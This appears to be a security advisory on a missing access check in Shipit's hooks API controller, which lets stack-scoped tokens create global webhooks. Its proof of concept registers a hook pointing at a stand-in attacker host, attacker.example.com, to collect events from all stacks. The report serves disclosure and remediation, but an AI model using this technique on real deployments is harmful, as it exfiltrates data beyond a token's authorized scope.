### Title
Stack-scoped API tokens can create and manage global webhook delivery `Hook`s outside their authorized stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController` enforces only an operation-level permission check (`write:hook`) but never verifies that a stack-scoped `ApiClient` is restricted to its own `stack`. By omitting the `stack_id` route/query parameter, a token that was provisioned to operate on a single stack can create, read, update, or delete *global* hooks, which are delivered for every stack in the Shipit instance.

### Finding Description
`ApiClient` supports being bound to a single stack: `belongs_to :stack, optional: true` [1](#0-0) , and `BaseController#stacks` is supposed to enforce that scoping wherever a stack-bound token is used: `current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all` [2](#0-1) .

`Api::HooksController`, however, computes its own scoping independently of that mechanism:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [3](#0-2) 

The only authorization gate applied to `create`/`update`/`destroy` is the coarse operation permission `write:hook`: `require_permission :write, :hook, only: %i[create update destroy]` [4](#0-3) , implemented generically as membership in the client's `permissions` array with no relation to `stack_id`: `check_permissions!` simply checks `"#{operation}:#{scope}"` inclusion [5](#0-4) .

Because `stack_id` in `HooksController` defaults to `nil` whenever the caller does not supply a `stack_id` param — regardless of whether the authenticated `ApiClient` itself is bound to a specific stack — a token holding `write:hook` and scoped (via `ApiClient#stack_id`) to a single stack can call the *global* hooks routes (`POST/GET/PATCH/DELETE /api/hooks[/:id]`, mounted at `resources :hooks, only: %i[index create show update destroy]` outside the `/stacks/*stack_id` scope [6](#0-5) ) and manage `Hook` records with `stack_id: nil`. Global hooks are delivered for events across **every** stack in the installation, not just the one the token was authorized for.

This is the same missing-access-control shape as the external report: the binding "the stack a token is authorized for" is never checked against "the stack (or absence thereof) a write actually touches" before the state-changing action (`hooks.create`, `hook.update`, `hook.destroy`) executes.

### Impact Explanation
An attacker holding a legitimately-issued, narrowly-scoped API token (bound to one stack, with only `write:hook` permission) can register a global `Hook` pointing at an attacker-controlled `delivery_url`. Because global hooks are emitted for lock/added/updated/removed events on *all* stacks (`Hook.emit` calls fired from `Stack` lifecycle callbacks [7](#0-6) ), this results in exfiltration of deploy/lock/status metadata belonging to stacks and repositories the token was never authorized to touch — a cross-stack/cross-repository information disclosure that exceeds the token's intended authorization boundary.

### Likelihood Explanation
Any deployment that issues stack-scoped API tokens with the `write:hook` permission (a documented, expected combination since `write:hook` is a first-class entry in `ApiClient::PERMISSIONS` [8](#0-7) ) is affected without any additional misconfiguration, TLS interception, or privileged access — only the normal, documented use of a scoped `ApiClient` token is required.

### Recommendation
In `Api::HooksController`, require that the resolved `stack_id` be consistent with `current_api_client.stack_id` whenever the client is stack-scoped, e.g. reuse `stacks` (from `BaseController`) instead of an independently computed `stack_id`, or explicitly reject requests to the global hooks routes when `current_api_client.stack_id?` is true.

### Proof of Concept
1. Admin issues an `ApiClient` with `stack: shipit_stacks(:shipit)` and `permissions: ['write:hook']`, intending it to manage hooks only for that stack.
2. Attacker (holder of that token) sends: `POST /api/hooks` with body `{"delivery_url":"https://attacker.example.com/collect","events":["deploy","lock"]}` and **no** `stack_id` in the path.
3. `HooksController#stack_id` returns `nil` (param absent) so `hooks` resolves to `Hook.where(stack_id: nil)`, and `create` succeeds, producing a global `Hook` unrelated to the token's assigned stack.
4. This hook now receives delivery for lock/added/updated/removed events on every stack in the Shipit instance, not just the one the token was scoped to [9](#0-8) .
